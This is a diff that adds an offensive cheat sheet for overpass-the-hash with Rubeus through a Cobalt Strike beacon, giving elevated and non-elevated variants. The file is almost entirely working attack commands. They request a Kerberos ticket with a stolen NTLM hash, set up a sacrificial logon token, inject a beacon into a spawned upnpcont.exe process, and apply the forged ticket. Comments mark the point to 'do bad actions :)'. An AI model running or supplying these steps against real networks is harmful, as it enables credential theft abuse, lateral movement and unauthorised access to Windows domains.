@@ -1,0 +1,50 @@
+OVERPASS THE HASH WITH RUBEUS-BEACON - H
+##### IF ELEVATED:
+
+# grab a TGT b64 blob with a valid NTLM/rc4 (or /aes256:X)
+beacon> execute-assembly /home/specter/Rubeus.exe asktgt /user:USER /rc4:NTLM_HASH
+
+# decode the base64 blob to a binary .kirbi
+$ base64 -d ticket.b64 > ticket.kirbi
+
+# sacrificial logon session (to prevent the TGT from overwriting your current logon session's TGT)
+beacon> make_token DOMAIN\USER PassWordDoesntMatter
+
+# inject the .kirbi
+beacon> kerberos_ticket_use /home/user/ticket.kirbi
+
+# do bad actions :)
+
+# revert- clears out the sacrificial logon session, so the original context's tickets are restored to normal
+beacon> rev2self
+
+
+
+##### IF NOT ELEVATED
+
+# grab a TGT b64 blob with a valid NTLM/rc4 (or /aes256:X)
+beacon> execute-assembly /home/specter/Rubeus.exe asktgt /user:USER /rc4:NTLM_HASH
+
+# decode the base64 blob to a binary .kirbi
+$ base64 -d ticket.b64 > ticket.kirbi
+
+# sacrificial logon session (to prevent the TGT from overwriting your current logon session's TGT)
+beacon> make_token DOMAIN\USER PassWordDoesntMatter
+
+# Create a sacrificial process.  We have to do this due to the way beacon handles tokens now. You can't create a process with a token as a low prived user.
+beacon> run C:\Windows\System32\upnpcont.exe
+
+# inject into the newly spawned process
+beacon> inject x64 <NEW_PID> <listener_name>
+
+# inject the .kirbi
+new beacon> kerberos_ticket_use /home/user/ticket.kirbi
+
+# do bad actions :)
+
+# kill the runas beacon when actions are completed
+
+# revert in the original beacon-
+beacon> rev2self
+
+
